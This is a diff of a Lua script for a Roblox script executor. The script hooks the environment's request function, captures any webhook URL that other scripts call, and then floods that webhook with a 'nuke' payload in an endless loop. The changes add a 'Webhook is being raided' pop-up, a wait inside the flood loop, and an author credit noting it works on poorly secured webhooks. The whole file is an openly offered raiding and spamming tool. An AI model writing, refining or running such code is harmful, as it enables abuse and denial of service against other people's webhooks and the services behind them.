@@ -1,4 +1,5 @@
 local HttpService = game:GetService("HttpService")
+local StarterGui = game:GetService("StarterGui")
 
 local nukeData = {
     ["content"] = getgenv().content,
@@ -39,6 +40,12 @@ if request then
                 sentWebhooks[req.Url] = true
                 sendEmbed(req.Url)
 
+                StarterGui:SetCore("SendNotification", {
+                    Title = "Start Raid Webhook",
+                    Text = "Webhook is being raided",
+                    Duration = 5
+                })
+
                 spawn(function()
                     while true do
                         oldRequest({
@@ -47,6 +54,7 @@ if request then
                             Headers = {["Content-Type"] = "application/json"},
                             Body = HttpService:JSONEncode(nukeData)
                         })
+                        task.wait()
                     end
                 end)
             end
@@ -56,6 +64,13 @@ if request then
 
         return oldRequest(req)
     end)
+
 else
     warn("request function is not available.")
 end
+
+StarterGui:SetCore("SendNotification", {
+        Title = "Script make by Cáo Mod",
+        Text = "note: it only raids poorly secured webhooks if there is a anti it will not work",
+        Duration = 7
+    })
